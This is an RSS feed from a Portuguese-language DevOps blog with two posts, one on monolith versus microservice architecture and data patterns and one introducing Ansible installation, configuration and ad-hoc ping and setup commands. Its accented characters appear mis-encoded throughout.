<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <docs>https://blogs.law.harvard.edu/tech/rss</docs>
    <title>FXShell - DevOps &amp; Sec</title>
    <link>https://fxshelll.github.io/posts/</link>
    <description>Recent content on FXShell - DevOps &amp; Sec</description>
    <ttl>1440</ttl>
    <generator>Hugo 0.123.7</generator>
    <language>pt-br</language>
    <lastBuildDate>Thu, 20 Nov 2025 16:14:19 UT</lastBuildDate>
    <atom:link href="https://fxshelll.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Monolito, Arquitetura em Camadas e Microsservi√ßos</title>
      <link>https://fxshelll.github.io/posts/arquitetura-de-aplica%C3%A7%C3%B5es/</link>
      <pubDate>Wed, 24 Sep 2025 12:00:00 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/arquitetura-de-aplica%C3%A7%C3%B5es/</guid>
      <description>üìå Introdu√ß√£o A evolu√ß√£o das arquiteturas de software mostra como as empresas buscam cada vez mais flexibilidade, escalabilidade e agilidade.
Do modelo monol√≠tico √†s arquiteturas em camadas e, mais recentemente, aos microsservi√ßos, a ideia √© clara: dividir para conquistar, ganhando autonomia de equipes e resili√™ncia em produ√ß√£o.
üß± Mon√≥lito Um mon√≥lito √© uma aplica√ß√£o √∫nica, onde todas as fun√ß√µes est√£o integradas em um √∫nico pacote.
‚úÖ Vantagens: simples de iniciar, f√°cil de testar no come√ßo e com menos sobrecarga operacional.</description>
      <content:encoded><![CDATA[üìå Introdu√ß√£o A evolu√ß√£o das arquiteturas de software mostra como as empresas buscam cada vez mais flexibilidade, escalabilidade e agilidade.
Do modelo monol√≠tico √†s arquiteturas em camadas e, mais recentemente, aos microsservi√ßos, a ideia √© clara: dividir para conquistar, ganhando autonomia de equipes e resili√™ncia em produ√ß√£o.
üß± Mon√≥lito Um mon√≥lito √© uma aplica√ß√£o √∫nica, onde todas as fun√ß√µes est√£o integradas em um √∫nico pacote.
‚úÖ Vantagens: simples de iniciar, f√°cil de testar no come√ßo e com menos sobrecarga operacional. ‚ö†Ô∏è Desafios: conforme cresce, fica dif√≠cil de escalar partes isoladas, e qualquer mudan√ßa pode impactar todo o sistema. üóÇÔ∏è Arquitetura em Camadas A arquitetura em camadas (como MVC ou hexagonal) surge para organizar melhor um mon√≥lito.
Ela separa responsabilidades em camadas distintas (ex.: interface, regras de neg√≥cio e dados), mas ainda mant√©m um √∫nico deploy.
üéØ Facilita a manuten√ß√£o e a clareza do c√≥digo. üöß Por√©m, ainda herda os limites de um mon√≥lito quando se fala em escalabilidade independente. üß© Microsservi√ßos Os microsservi√ßos levam a modularidade ao extremo: cada servi√ßo √© independente, com sua pr√≥pria l√≥gica, ciclo de vida e, muitas vezes, at√© banco de dados.
Eles se comunicam entre si via APIs ou mensageria e permitem que times diferentes trabalhem de forma aut√¥noma.
üåü Caracter√≠sticas principais üß≠ Autonomia: cada microsservi√ßo tem uma responsabilidade √∫nica. üë• Desenvolvimento descentralizado: times independentes, podendo usar diferentes linguagens e frameworks. üìà Escalabilidade seletiva: escale apenas os servi√ßos que exigem mais recursos. üîå Comunica√ß√£o via API: REST, GraphQL, gRPC ou mensageria ass√≠ncrona. ‚ö†Ô∏è Desafios a considerar üß∂ Complexidade sist√™mica: o todo √© mais complexo, exigindo boa orquestra√ß√£o e observabilidade. üß™ Desenvolvimento e testes: depend√™ncias entre servi√ßos exigem testes de contrato e ambientes bem preparados. üìè Governan√ßa descentralizada: liberdade das equipes pode virar caos sem padr√µes m√≠nimos. üê¢ Lat√™ncia: m√∫ltiplas chamadas podem acumular atraso. üßÆ Consist√™ncia de dados: cada servi√ßo mant√©m seus dados ‚Üí aplica-se consist√™ncia eventual. üîç Monitoramento e logs: tracing distribu√≠do e correla√ß√£o de logs s√£o obrigat√≥rios. üîÅ Versionamento: mudan√ßas em APIs devem manter compatibilidade retroativa. üë©‚Äçüíª Compet√™ncias da equipe: CI/CD, containers, Kubernetes e automa√ß√£o s√£o essenciais. üé¨ Exemplo pr√°tico (sistema de streaming) Um sistema de streaming pode ser dividido em microsservi√ßos como:
üì° Ingest√£o: recebe dados do sat√©lite e armazena. üéûÔ∏è Transcodifica√ß√£o: converte v√≠deos para formatos web. üñ•Ô∏è Interface: apresenta dados e v√≠deos aos usu√°rios. ‚úÇÔ∏è Clipping: corta v√≠deos em pequenos trechos sob demanda. ‚è´ Publica√ß√£o: faz upload em redes sociais via filas. Esse desenho permite que cada servi√ßo evolua de forma independente, trazendo agilidade e resili√™ncia.
üåê Mercado e Tend√™ncias A ado√ß√£o de microsservi√ßos reflete n√£o s√≥ uma decis√£o t√©cnica, mas tamb√©m uma mudan√ßa cultural.
‚è±Ô∏è Time-to-market: empresas aceleram entregas sem impactar o sistema todo. üè≠ Grandes players: cases como o Mercado Livre mostram escalabilidade e resili√™ncia em larga escala. üîó APIs e composi√ß√£o de servi√ßos: microsservi√ßos se tornam blocos reutiliz√°veis, compondo novas experi√™ncias digitais. ‚öôÔ∏è DevOps e automa√ß√£o: CI/CD, containers, Kubernetes e monitoramento s√£o a base para que microsservi√ßos entreguem valor real. ‚úÖ Conclus√£o Microsservi√ßos n√£o s√£o a solu√ß√£o m√°gica para todos os cen√°rios. Eles funcionam bem quando existe:
Times maduros em DevOps e automa√ß√£o. Necessidade de escalabilidade granular. Demanda por entregas frequentes e independentes. Para contextos menores ou MVPs, muitas vezes √© mais eficiente come√ßar com um mon√≥lito bem estruturado e evoluir gradualmente.
O segredo est√° em alinhar estrat√©gia de neg√≥cio &#43; maturidade t√©cnica.
Vis√£o Geral Mon√≥lito: aplica√ß√£o √∫nica, um deploy para tudo. Arquitetura em Camadas (Layered): organiza√ß√£o interna em camadas (UI, aplica√ß√£o, dom√≠nio, infra). Microsservi√ßos: v√°rias aplica√ß√µes pequenas, independentes e comunicando via APIs ou eventos. 1. Mon√≥lito O que √© Uma aplica√ß√£o √∫nica, com todas as funcionalidades, que roda e √© implantada como um bloco s√≥.
Quando usar Produtos em fase inicial. Equipes pequenas. Dom√≠nio ainda pouco definido. Vantagens Simples de desenvolver, testar e implantar. Transa√ß√µes ACID f√°ceis (um √∫nico banco). Performance interna (chamadas em mem√≥ria). Custos menores no in√≠cio. Desafios Acoplamento crescente ‚Üí evolu√ß√£o dif√≠cil. Deploy √∫nico ‚Üí risco alto. Escalabilidade desigual (escala tudo). Com o tempo, vira o famoso Big Ball of Mud. Boas pr√°ticas Criar m√≥dulos separados (Mon√≥lito Modular). Usar camadas bem definidas (UI, dom√≠nio, infra). Aplicar DDD leve (entidades, servi√ßos de dom√≠nio). Adotar CI/CD e feature flags para reduzir riscos. 2. Arquitetura em Camadas (Layered) Estilo de organiza√ß√£o interna que pode ser aplicado em mon√≥litos ou microsservi√ßos.
Camadas t√≠picas Apresenta√ß√£o (UI/API): controllers, valida√ß√µes, DTOs. Aplica√ß√£o/Servi√ßos: orquestra casos de uso. Dom√≠nio (Core): entidades, regras de neg√≥cio, policies. Infraestrutura: persist√™ncia, mensageria, APIs externas. Benef√≠cios Separa√ß√£o de responsabilidades clara. Testabilidade alta. Evolu√ß√£o mais segura. Cuidados Evitar modelo an√™mico. Respeitar a dire√ß√£o de depend√™ncias (UI ‚Üí App ‚Üí Dom√≠nio ‚Üí Infra). N√£o deixar a infraestrutura ‚Äúvazar‚Äù para o dom√≠nio. 3. Microsservi√ßos O que √© Conjunto de servi√ßos pequenos, aut√¥nomos, donos do pr√≥prio banco e alinhados a subdom√≠nios de neg√≥cio.
Quando faz sentido Dom√≠nio j√° est√°vel. Necessidade de escala granular. Equipes m√∫ltiplas (squads) aut√¥nomas. Resili√™ncia e deploys independentes s√£o prioridade. Vantagens Escala por servi√ßo. Deploy independente. Autonomia de tecnologia (stack diferente por servi√ßo). Resili√™ncia a falhas locais. Desafios Complexidade distribu√≠da (rede, lat√™ncia, retries). Dados distribu√≠dos (eventual consistency). Observabilidade (logs, m√©tricas, tracing distribu√≠do). Governan√ßa (versionamento, contratos). Custos maiores de opera√ß√£o. Boas pr√°ticas Definir Bounded Contexts (DDD). Um banco por servi√ßo. Preferir comunica√ß√£o ass√≠ncrona (eventos, filas). Usar contratos versionados. Implementar padr√µes de resili√™ncia (circuit breaker, timeout, retries). Adotar OpenTelemetry e tracing distribu√≠do. Plataforma robusta: CI/CD, registro de imagens, policies. 4. Comparativo Crit√©rio Mon√≥lito Camadas (estilo) Microsservi√ßos Time-to-market inicial Excelente n/a Bom Complexidade Baixa ‚Äî Alta Escalabilidade Fraca (escala tudo) ‚Äî Forte Deploy independente N√£o ‚Äî Sim Consist√™ncia Forte (ACID) ‚Äî Eventual (Sagas) Equipe Pequena ‚Äî M√©dia/Grande Custos iniciais Baixos ‚Äî Altos Evolu√ß√£o longo prazo Pode degradar ‚Äî Alta 5. Estrat√©gias de Migra√ß√£o Strangler Fig: cercar o mon√≥lito e extrair features aos poucos. Modularizar antes de cortar. Usar Anticorruption Layer para lidar com sistemas legados. Definir estrat√©gia de dados (sagas/eventos). Come√ßar pelos hotspots (m√≥dulos com mais dor de escala ou evolu√ß√£o). 6. Exemplo Pr√°tico (Streaming) Mon√≥lito inicial Ingest√£o de dados. Transcodifica√ß√£o. Cat√°logo. Entrega de v√≠deo. Backoffice. Microsservi√ßos candidatos Ingest√£o de Sat√©lite (raw storage &#43; metadados). Transcodifica√ß√£o (pipeline ass√≠ncrono). Cat√°logo (busca &#43; DB separado). Clip/Highlights (recorte sob demanda). Distribui√ß√£o Social (upload em redes sociais). BFF (Web/App) (agrega√ß√£o de APIs). Fluxo Ingest√£o ‚Üí evento ‚ÄúArquivoDispon√≠vel‚Äù ‚Üí Transcodifica√ß√£o ‚Üí evento ‚ÄúVers√µesProntas‚Äù ‚Üí Cat√°logo ‚Üí BFF ‚Üí CDN/Entrega ‚Üí Upload Social.
7. Anti-padr√µes Banco de dados compartilhado entre servi√ßos. Nanosservi√ßos (excesso de fragmenta√ß√£o). Comunica√ß√£o sincr√¥nica em cascata. Migra√ß√£o ‚Äúbig bang‚Äù. Servi√ßos sem CI/CD e sem observabilidade. 8. Checklists Manter Mon√≥lito Time pequeno. Produto no in√≠cio. Escala resolv√≠vel com cache/CDN. Deploys menos frequentes aceit√°veis. Migrar para Microsservi√ßos Contexto de neg√≥cio bem delimitado. Dor real de escala ou releases independentes. Plano de observabilidade e dados definido. Estrat√©gia de contratos e versionamento. Conclus√£o Comece com mon√≥lito modular em camadas. Evolua para microsservi√ßos onde realmente d√≥i. Foque em resili√™ncia, observabilidade e governan√ßa ao distribuir. Arquitetura √© sobre trade-offs: cada escolha tem custo e benef√≠cio. 3. Banco de dados com Microsservi√ßos üóÑÔ∏è SQL (Relacional) Os bancos relacionais, como PostgreSQL, MySQL e SQL Server, s√£o ideais para sistemas que exigem integridade e transa√ß√µes seguras.
Caracter√≠sticas:
‚úÖ Transa√ß√µes ACID ‚Äî garantem Atomicidade, Consist√™ncia, Isolamento e Durabilidade. üîç Consultas complexas com JOIN, agrega√ß√µes e filtros avan√ßados. üîí Integridade referencial assegurada por chaves e restri√ß√µes. Quando usar:
üí≥ Aplica√ß√µes que exigem consist√™ncia forte (bancos, pagamentos, e-commerce). üßæ Regras de neg√≥cio r√≠gidas e alto controle de integridade. üß† NoSQL (N√£o Relacional) Bancos como MongoDB, Cassandra e Redis oferecem flexibilidade e escalam facilmente em ambientes distribu√≠dos.
Caracter√≠sticas:
üß± Flexibilidade de esquema ‚Äî n√£o requer estrutura fixa de tabelas. üìà Escalabilidade horizontal ‚Äî adiciona n√≥s conforme o volume de dados cresce. ‚è≥ Consist√™ncia eventual, priorizando disponibilidade e desempenho. Quando usar:
üåê Aplica√ß√µes que precisam escalar rapidamente (IoT, redes sociais, streaming). üìä Dados n√£o estruturados ou sem formato fixo. 2. Teorema CAP O Teorema CAP define tr√™s propriedades que todo sistema distribu√≠do tenta equilibrar:
Elemento Descri√ß√£o üß≠ Consist√™ncia (C) Todos os n√≥s veem os mesmos dados ao mesmo tempo. ‚öôÔ∏è Disponibilidade (A) O sistema sempre responde, mesmo em falhas. üåç Toler√¢ncia a Parti√ß√µes (P) O sistema continua operando mesmo que partes falhem. üí° Nenhum sistema distribu√≠do consegue garantir as tr√™s propriedades simultaneamente.
Por isso:
Bancos SQL priorizam Consist√™ncia &#43; Disponibilidade. Bancos NoSQL priorizam Disponibilidade &#43; Particionamento, aceitando consist√™ncia eventual. 3. Estrat√©gias em Microsservi√ßos üîπ Database per Service Cada microsservi√ßo deve ter seu pr√≥prio banco, evitando compartilhamento entre dom√≠nios.
Isso simplifica deploys, escalabilidade e manuten√ß√£o.
üîπ CQRS (Command Query Responsibility Segregation) Separa as opera√ß√µes de escrita (commands) das de leitura (queries).
Essa abordagem melhora o desempenho e permite otimiza√ß√µes espec√≠ficas para cada tipo de opera√ß√£o.
üîπ Event Sourcing Cada mudan√ßa de estado √© registrada como um evento imut√°vel.
A aplica√ß√£o pode reconstruir seu estado a partir desses eventos, garantindo rastreabilidade e hist√≥rico.
üîπ Sagas Coordenam transa√ß√µes distribu√≠das usando eventos ass√≠ncronos em vez de bloqueios.
Cada etapa √© compensada caso algo falhe, garantindo consist√™ncia eventual sem 2PC.
4. Exemplos Pr√°ticos üßæ Exemplo 1 ‚Äî E-commerce üõçÔ∏è Cat√°logo: usa MongoDB (NoSQL) para lidar com atributos de produtos din√¢micos. üí≥ Pagamentos: usa PostgreSQL (SQL) para transa√ß√µes ACID seguras. üîÅ Pedidos: implementa Event Sourcing e CQRS para conciliar leitura e escrita. üì¨ Mensageria: utiliza Kafka para sincronizar eventos entre servi√ßos. ‚û°Ô∏è Cada m√≥dulo √© aut√¥nomo, promovendo escalabilidade e consist√™ncia eventual.
üé¨ Exemplo 2 ‚Äî Plataforma de Streaming üë• Usu√°rios: armazenados em Cassandra (NoSQL), com alta escalabilidade. üîé Recomenda√ß√µes: processadas em Elasticsearch, com buscas em tempo real. ‚ñ∂Ô∏è Hist√≥rico de reprodu√ß√£o: baseado em Event Sourcing. ‚öôÔ∏è CQRS: separa ingest√£o de m√≠dia (escrita) de consultas e recomenda√ß√µes (leitura). ‚û°Ô∏è Essa estrutura garante personaliza√ß√£o e performance em alto volume de acessos.
5. Mercado e Tend√™ncias A ado√ß√£o de microsservi√ßos cresce entre grandes empresas, impulsionada pela necessidade de agilidade, escalabilidade e independ√™ncia de equipes.
üöÄ Ado√ß√£o Corporativa Mais de 75% das empresas globais j√° migraram ou est√£o migrando de mon√≥litos para microsservi√ßos. Amazon, Netflix, Spotify e Mercado Livre s√£o exemplos consolidados de sucesso. ‚öôÔ∏è Persist√™ncia Poliglota (Polyglot Persistence) Cada servi√ßo pode escolher o banco mais adequado ao seu contexto:
SQL para transa√ß√µes seguras. NoSQL para grandes volumes de dados din√¢micos. üß∞ Plataformas em alta ‚òÅÔ∏è AWS DynamoDB, Azure Cosmos DB ‚Äî bancos NoSQL globais. üì¨ Kafka, RabbitMQ ‚Äî mensageria ass√≠ncrona e escal√°vel. üìà Grafana, Prometheus ‚Äî observabilidade e m√©tricas em sistemas distribu√≠dos. ü§ñ O Futuro Microsservi√ßos tendem a se integrar a:
üß† Machine Learning para decis√µes aut√¥nomas. ‚ö° Arquiteturas event-driven e serverless (FaaS). üåø Sustentabilidade e otimiza√ß√£o de recursos via automa√ß√£o inteligente. Conclus√£o Integrar bancos de dados em microsservi√ßos √© equilibrar autonomia com consist√™ncia.
Cada servi√ßo deve possuir seus pr√≥prios dados, comunicar-se por eventos e adotar padr√µes como CQRS, Sagas e Event Sourcing.
Benef√≠cios:
‚ö° Escalabilidade sob demanda üîÑ Menor acoplamento üß± Resili√™ncia operacional üß≠ Evolu√ß√£o independente ‚ÄúMicrosservi√ßos n√£o s√£o apenas sobre c√≥digo ‚Äî s√£o sobre dados bem distribu√≠dos e controlados.‚Äù
A comunica√ß√£o entre microsservi√ßos √© um dos pilares essenciais para o funcionamento de arquiteturas distribu√≠das.
Ela define como os servi√ßos conversam entre si, como trocam informa√ß√µes, como reagem a eventos e como mant√™m a consist√™ncia entre dom√≠nios diferentes.
Existem tr√™s modelos principais:
Comunica√ß√£o S√≠ncrona (HTTP / REST / gRPC) Comunica√ß√£o Ass√≠ncrona (mensageria: Kafka, RabbitMQ, SQS, etc.) Comunica√ß√£o via API Gateway (camada intermedi√°ria de acesso) Cada modelo tem vantagens, desvantagens e cen√°rios ideais.
1. Comunica√ß√£o S√≠ncrona O que √© O servi√ßo cliente faz uma requisi√ß√£o e espera pela resposta do servidor.
√â o modelo cl√°ssico de comunica√ß√£o ‚Äî simples, direto e previs√≠vel.
Os dois protocolos mais comuns s√£o:
REST / HTTP gRPC (mais moderno, bin√°rio, r√°pido) üß© REST / HTTP Vantagens Simplicidade: f√°cil de implementar, usando conceitos conhecidos de HTTP. Controle de fluxo: o cliente recebe resposta imediata e pode tomar decis√µes. Desvantagens Acoplamento temporal: se o servidor cai, o cliente tamb√©m ‚Äúquebra‚Äù. Baixa resili√™ncia: toda opera√ß√£o depende da disponibilidade imediata. Escalabilidade limitada: muitas conex√µes simult√¢neas podem sobrecarregar o servi√ßo. Exemplo (vis√£o conceitual) Cliente ‚Üí GET /api/produtos ‚Üí Servidor
‚ö° gRPC O que √© Tecnologia criada pelo Google para comunica√ß√µes extremamente r√°pidas, baseada em:
Serializa√ß√£o bin√°ria (Protocol Buffers) Streams bidirecionais Contratos fortemente tipados Vantagens Alta performance (mais r√°pido que JSON/REST) Baixo consumo de banda Perfeito para comunica√ß√£o interna entre microsservi√ßos Desvantagens Complexidade maior Dif√≠cil expor diretamente para front-end Requer suporte especial em API Gateways 2. Comunica√ß√£o Ass√≠ncrona O que √© O cliente envia uma mensagem e n√£o espera resposta imediata.
O servidor processa quando puder, usando filas ou streams.
Tecnologias mais comuns:
RabbitMQ Kafka AWS SQS NATS Pulsar Vantagens Desacoplamento temporal: o cliente n√£o depende do tempo de resposta. Alta resili√™ncia: mesmo com falhas tempor√°rias, o sistema continua operando. Alta escalabilidade: filas absorvem picos de tr√°fego. Desvantagens Complexidade maior: exige infraestrutura adicional (brokers). Mensagens podem falhar: √© preciso lidar com retries, deduplica√ß√£o e DLQ. Debug mais dif√≠cil: event-driven exige tracing distribu√≠do. Exemplo (conceitual) Servi√ßo A ‚Üí envia mensagem ‚Üí Fila ‚Üí Servi√ßo B processa quando poss√≠vel
3. Comunica√ß√£o via API Gateway O que √© Um √∫nico ponto de entrada (gateway) que recebe, roteia e controla as requisi√ß√µes para os microsservi√ßos internos.
Exemplo de gateways:
Kong Traefik Apigee Amazon API Gateway NGINX como gateway Vantagens Um endpoint √∫nico para o cliente Centraliza√ß√£o de autentica√ß√£o e seguran√ßa Transforma√ß√£o de payloads (JSON, Protobuf, etc.) Rate limiting, caching, m√©tricas integradas Desvantagens Ponto √∫nico de falha se n√£o for bem configurado Adicionar lat√™ncia Requer alta disponibilidade 4. Mercado, Cases e Tend√™ncias A comunica√ß√£o entre microsservi√ßos est√° evoluindo rapidamente.
As empresas buscam modelos mais r√°pidos, resilientes e observ√°veis.
üîπ 1. Hibridiza√ß√£o ‚Äî REST &#43; Mensageria A tend√™ncia mais forte hoje:
REST/gRPC para opera√ß√µes r√°pidas e cr√≠ticas Async (Kafka / RabbitMQ) para propaga√ß√£o de eventos Exemplo pr√°tico:
Pedido criado ‚Üí REST Pedido confirmado ‚Üí evento Kafka para estoque, faturamento, notifica√ß√£o üîπ 2. Gateways inteligentes Gateways modernos fazem muito mais do que roteamento:
üö¶ Rate limiting üîê OAuth2 / OpenID Connect üìä Observabilidade embutida üîÑ Transforma√ß√£o de dados üîÅ Reescrita de rotas Eles se tornaram parte essencial da camada de comunica√ß√£o.
üîπ 3. Observabilidade e Tracing Distribu√≠do Com dezenas de microsservi√ßos conversando, rastrear chamadas √© obrigat√≥rio.
Ferramentas:
OpenTelemetry Jaeger Datadog APM Honeycomb Objetivos:
Mapear fluxos entre servi√ßos Identificar gargalos Medir lat√™ncia Diagnosticar falhas de comunica√ß√£o üîπ 4. Crescimento do gRPC Cada vez mais empresas usam gRPC para comunica√ß√£o interna:
Baixa lat√™ncia Alto desempenho Contratos fortes Streams bidirecionais REST domina o front-end,
mas gRPC domina o back-end moderno.
Conclus√£o A diferen√ßa entre comunica√ß√£o s√≠ncrona e ass√≠ncrona Como REST, gRPC e mensageria se complementam O papel do API Gateway em sistemas complexos As tend√™ncias de mercado como event-driven, tracing distribu√≠do e gateways inteligentes A escolha do tipo de comunica√ß√£o influencia diretamente:
üìà escalabilidade ‚ö° performance üîÑ resili√™ncia üß± arquitetura Microsservi√ßos n√£o s√£o apenas ‚Äúv√°rios servi√ßos pequenos‚Äù:
a forma como eles conversam define a qualidade do sistema inteiro.
]]></content:encoded>
    </item>
    <item>
      <title>Ansible</title>
      <link>https://fxshelll.github.io/posts/ansible/</link>
      <pubDate>Tue, 30 Mar 2021 00:56:17 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/ansible/</guid>
      <description>O ansible √© uma forma de comunica√ß√£o superluminica. Ou seja passar uma informa√ß√£o ao mesmo tempo para objetos.
√â uma ferramenta opensource que te possibilita realizar comunica√ß√£o e intera√ß√£o com diversos destinos ao mesmo tempo, tudo de forma automatizada.
- Gerenciamento de mudan√ßa - Provisionamento - Automa√ß√£o - Orquestra√ß√£o Gerenciamento de Mudan√ßa =&amp;gt; Idempotente Executa somente uma vez as altera√ß√µes, se n√£o houve altera√ß√£o ele n√£o executa.
=&amp;gt; Pode tamb√©m criar rotinas automatizadas por vers√£o, exemplo (php7 em uma maquina client, rodo o ansible que est√° configurado com o php 7.</description>
      <content:encoded><![CDATA[
O ansible √© uma forma de comunica√ß√£o superluminica. Ou seja passar uma informa√ß√£o ao mesmo tempo para objetos.
√â uma ferramenta opensource que te possibilita realizar comunica√ß√£o e intera√ß√£o com diversos destinos ao mesmo tempo, tudo de forma automatizada.
- Gerenciamento de mudan√ßa - Provisionamento - Automa√ß√£o - Orquestra√ß√£o Gerenciamento de Mudan√ßa =&amp;gt; Idempotente Executa somente uma vez as altera√ß√µes, se n√£o houve altera√ß√£o ele n√£o executa.
=&amp;gt; Pode tamb√©m criar rotinas automatizadas por vers√£o, exemplo (php7 em uma maquina client, rodo o ansible que est√° configurado com o php 7.5, ele vai reverter tudo para o 7.5)
Provisionamento =&amp;gt; Configura√ß√£o =&amp;gt; Instala√ß√£o =&amp;gt; Prepara√ß√£o =&amp;gt; Altera√ß√£o do System State
Automa√ß√£o =&amp;gt; Execu√ß√£o de tarefas de forma autom√°tica =&amp;gt; Ordena√ß√£o de tarefas (tasks) =&amp;gt; Realizar decis√µes =&amp;gt; Ad-hoc tasks
Orquestra√ß√£o =&amp;gt; M√∫lt√≠iplos servidores =&amp;gt; Muliplas aplica√ß√µes =&amp;gt; Diferentes tarefas =&amp;gt; Ambiente Hibrido
Por que o Ansible? De que forma o Ansible √© diferente de outras ferramentas?
√â f√°cil - o Ansible usa uma sintaxe simples (YAML) e √© f√°cil para qualquer pessoa (desenvolvedores, administradores de sistemas, gerentes) entender. APIs s√£o simples e √∫teis.
Sem agente - Ansible usa ssh para conectar e executar comandos. Voc√™ n√£o precisa de nenhum agente / software adicional em execu√ß√£o no seu cliente.
Configura√ß√£o r√°pida - como voc√™ n√£o precisa instalar agentes ou daemons extras, a configura√ß√£o √© muito simples e r√°pida.
Seguro - uma vez que usa ssh para comunica√ß√£o, √© muito seguro e protegido. N√£o requer nenhuma porta extra ou daemons vulner√°veis ‚Äã‚Äãem seus servidores.
Arquitetura &amp;amp; funcionamento do Ansible Como ele funciona? Desenvolvido em python, vers√£o &amp;lt;3.5 ou Python &amp;lt;2.7
Procura sempre o interpretador em /usr/bin/python &amp;ndash;&amp;gt; Variavel: ansible_python_interpreter
Utiliza-se tamb√©m do servi√ßo SSH para comunica√ß√£o com os servidores linux, like ou WinRM para comunica√ß√£o com servidores M$ Windows.
-&amp;gt; Usu√°rio &#43; Senha -&amp;gt; Chave SSH (Para servidores Linux)
Autentica√ß√£o descentralizada
Pode-se autenticar/conectar-se com LDAP e kerberos.
Instala√ß√£o do Ansible Por padr√£o, o Ansible gerencia as m√°quinas por meio do protocolo SSH. Depois que o Ansible for instalado, ele n√£o adicionar√° um banco de dados e n√£o haver√° daemons para iniciar ou manter em execu√ß√£o. Voc√™ s√≥ precisa instal√°-lo em uma m√°quina e ele pode gerenciar uma frota inteira de m√°quinas remotas a partir desse ponto central. Quando o Ansible gerencia m√°quinas remotas, ele n√£o deixa o software instalado ou em execu√ß√£o nelas, ent√£o n√£o h√° d√∫vidas reais sobre como atualizar o Ansible ao mudar para uma nova vers√£o.
A √∫nica depend√™ncia que o Ansible tem para instala√ß√£o √© o Python. O Ansible pode ser instalado diretamente usando o gerenciador de pacotes do sistema operacional com base no sistema operacional que voc√™ est√° executando e via pip, que √© o gerenciador de pacotes do Python.
RHEL / CentOS / Fedora: Certifique-se de habilitar o repo EPEL antes de executar o comando abaixo para RHEL e CentOS.
sudo yum install ansible Ubuntu:
$ $ sudo apt-add-repository ppa:ansible/ansible $ sudo apt-get update $ sudo apt-get install ansible Instala√ß√£o Ansible usando pip
(caso n√£o tenha o pip instalado fa√ßa:)
$ sudo apt-get install python3-pip E depois instale o ansible:
$ sudo pip3 install ansible Se precisar fazer upgrade
$ sudo pip3 install ansible --upgrade - instale o ssh - gere sua chave ssh, ssh-keygen -t rsa - instale o sshpass Configurando o Ansible O principal arquivo de configura√ß√£o do ansible, √© o ansible.cfg
Sua localiza√ß√£o padr√£o √© /etc/ansible/ansible.cfg
Altera√ß√µes e configura√ß√µes s√£o interpretadas respeitando a seguinte ordem.:
-&amp;gt; V√°riavel ANSIBLE_CONFIG -&amp;gt; ansible.cfg no diretorio corrente -&amp;gt; .ansible.cfg diretorio home -&amp;gt; /etc/ansible/ansible.cfg
A primeira coisa a se fazer √© fazer uma c√≥pia do &amp;lsquo;ansible.cfg&amp;rsquo;, que fica dentro do /etc/ansible/
Preservei o original e joguei um arquivo mais resumido com as op√ß√µes mais utilizadas do ansible.
[defaults] #--- General settings forks = 5 log_path = /var/log/ansible.log module_name = command executable = /bin/bash ansible_managed = Ansible managed #--- Files/Directory settings inventory = /etc/ansible/hosts library = /usr/share/my_modules remote_tmp = ~/.ansible/tmp local_tmp = ~/.ansible/tmp roles_path = /etc/ansible/roles #--- Users settings remote_user = root sudo_user = root ask_pass = no ask-sudo_pass = no #--- SSH settings remote_port = 22 timeout = 10 host_key_checking = False ssh_executable = /usr/bin/ssh private_key_file = ~/.ssh/id_rsa [privilege_scalation] become = True become_method = sudo become_user = root become_ask_pass = False [ssh_connection] scp_if_ssh = smart transfer_method = smart retries = 3 Testando na maquina alvo osboxes@FXSHELL:/etc/ansible$ ansible 192.168.1.151 -u osboxes -k -m ping [WARNING]: log file at /var/log/ansible.log is not writeable and we cannot create it, aborting SSH password: [DEPRECATION WARNING]: Distribution debian 10.0 on host 192.168.1.151 should use /usr/bin/python3, but is using /usr/bin/python for backward compatibility with prior Ansible releases. A future Ansible release will default to using the discovered platform python for this host. See https://docs.ansible.com/ansible /2.10/reference_appendices/interpreter_discovery.html for more information. This feature will be removed in version 2.12. Deprecation warnings can be disabled by setting deprecation_warnings=False in ansible.cfg. 192.168.1.151 | SUCCESS =&amp;gt; { &amp;#34;ansible_facts&amp;#34;: { &amp;#34;discovered_interpreter_python&amp;#34;: &amp;#34;/usr/bin/python&amp;#34; }, &amp;#34;changed&amp;#34;: false, &amp;#34;ping&amp;#34;: &amp;#34;pong&amp;#34; } osboxes@FXSHELL:/etc/ansible$ [DEPRECATION WARNING]: Distribution debian 10.0 on host 192.168.1.234 should use /usr/bin/python3, but is using /usr/bin/python for backward compatibility with prior Ansible releases. A future Ansible release will default to using the discovered platform python for this host. See https://docs.ansible.com/ansible /2.10/reference_appendices/interpreter_discovery.html for more information. This feature will be removed in version 2.12. Deprecation warnings can be disabled by setting deprecation_warnings=False in ansible.cfg. 192.168.1.234 | SUCCESS =&amp;gt; { &amp;#34;ansible_facts&amp;#34;: { &amp;#34;discovered_interpreter_python&amp;#34;: &amp;#34;/usr/bin/python&amp;#34; }, &amp;#34;changed&amp;#34;: false, &amp;#34;invocation&amp;#34;: { &amp;#34;module_args&amp;#34;: { &amp;#34;data&amp;#34;: &amp;#34;pong&amp;#34; } }, &amp;#34;ping&amp;#34;: &amp;#34;pong&amp;#34; } META: ran handlers META: ran handlers osboxes@FXSHELL:/etc/ansible$ Podemos tamb√©m explicitar para ele ignorar a mensagem do python.
basta adicionar no ansible.cfg a linha
interpreter_python = auto_legacy_silent osboxes@FXSHELL:/etc/ansible$ ansible 192.168.1.234 -u osboxes -k -m ping [WARNING]: log file at /var/log/ansible.log is not writeable and we cannot create it, aborting SSH password: 192.168.1.234 | SUCCESS =&amp;gt; { &amp;#34;ansible_facts&amp;#34;: { &amp;#34;discovered_interpreter_python&amp;#34;: &amp;#34;/usr/bin/python&amp;#34; }, &amp;#34;changed&amp;#34;: false, &amp;#34;ping&amp;#34;: &amp;#34;pong&amp;#34; } osboxes@FXSHELL:/etc/ansible$ Existe um modulo bem interessante chamado ansible facts, varrendo todos os targets montando uma especie de invent√°rio deles.
Para buscar essas informa√ß√µes basta executar o modulo &amp;lsquo;setup&amp;rsquo;
osboxes@FXSHELL:/etc/ansible$ ansible 192.168.1.234 -u osboxes -k -m setup Tamb√©m existe um modulo chamado systemd com o argumento &amp;lsquo;-a&amp;rsquo; com &amp;ldquo;name=ssh state=restarted&amp;rdquo;
Ficando dessa forma:
